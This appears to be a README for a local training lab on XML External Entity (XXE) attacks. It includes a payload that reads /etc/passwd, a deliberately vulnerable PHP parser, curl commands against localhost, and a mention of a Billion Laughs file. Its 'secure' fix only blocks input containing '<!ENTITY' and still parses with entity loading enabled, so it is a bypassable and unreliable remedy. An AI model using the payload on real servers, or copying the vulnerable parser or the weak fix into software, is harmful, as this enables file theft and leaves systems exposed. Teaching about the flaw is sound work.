# Example of XXE Vulnerability

An XXE vulnerability allows an attacker to execute commands on a server using XML entities.

**To test this vulnerability you must navigate to the XXE directory where the exploits are located:**

```bash
cd ./XXE
```

### XML Entities

An XML entity works similarly to a variable: it allows storing content to display it in another part of the file. SYSTEM type entities allow accessing system files.

```
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd"> // Read the content of /etc/passwd
]>
<foo>&xxe;</foo>
```

### Vulnerable Code

http://localhost:8080/XXE/xxe.php

This code displays the content of an XML file passed to it as a parameter.

```
<?php
/* Display PHP Errors */
ini_set('display_errors', 1);
error_reporting(E_ALL);

/* Create a DOM Document */
$dom = new DOMDocument();

/* Get the XML loaded in the POST Requests */
$dom->loadXML(file_get_contents('php://input'), LIBXML_NOENT | LIBXML_DTDLOAD);

/* Convert the XML document into a SimpleXMLDocument*/
$parsed = simplexml_import_dom($dom);

/* Shows the result */
echo $parsed;
?>
```

You can send a file to the website using the `curl` command.

**Linux / macOS (Bash):**
```bash
curl -X POST http://localhost:8080/XXE/xxe.php -H "Content-Type: text/xml; charset=UTF-8" --data-binary "@safe.xml"
```

**Windows (PowerShell / CMD):**
```powershell
curl.exe -X POST http://localhost:8080/XXE/xxe.php -H "Content-Type: text/xml; charset=UTF-8" --data-binary "@safe.xml"
```

![alt text](./images/xxe_safe_example.png)

If you send an XML file with SYSTEM entities you can access system files.

**Linux / macOS (Bash):**
```bash
curl -X POST http://localhost:8080/XXE/xxe.php -H "Content-Type: text/xml; charset=UTF-8" --data-binary "@xxe_payload_passwords.xml"
```

**Windows (PowerShell / CMD):**
```powershell
curl.exe -X POST http://localhost:8080/XXE/xxe.php -H "Content-Type: text/xml; charset=UTF-8" --data-binary "@xxe_payload_passwords.xml"
```

> [!NOTE]
> Inside this folder there is an `xxe_payload_billion.xml` file containing the payload of a vulnerability called "Billion Laughs" which crashes a server by saturating RAM memory with recursive variables. However, PHP is capable of detecting and blocking this vulnerability, so it cannot be executed; you can save it if you want to test on an older server.

![alt text](./images/xxe_passwd.png)

### Secure Code

To eliminate this vulnerability, the ideal approach is to prohibit executing XML files containing entities.

```
/* If the XML Document contains entities finish the execution */
if (strpos(file_get_contents('php://input'), "<!ENTITY") !== false){
    die("No se permiten entidades externas");
}
```

Send the payload from the etc/passwd file to the secure PHP script.

**Linux / macOS (Bash):**
```bash
curl -X POST http://localhost:8080/XXE/xxe_secured.php -H "Content-Type: text/xml; charset=UTF-8" --data-binary "@xxe_payload_passwords.xml"
```

**Windows (PowerShell / CMD):**
```powershell
curl.exe -X POST http://localhost:8080/XXE/xxe_secured.php -H "Content-Type: text/xml; charset=UTF-8" --data-binary "@xxe_payload_passwords.xml"
```

![alt text](./images/fail_xxe_passwd.png)
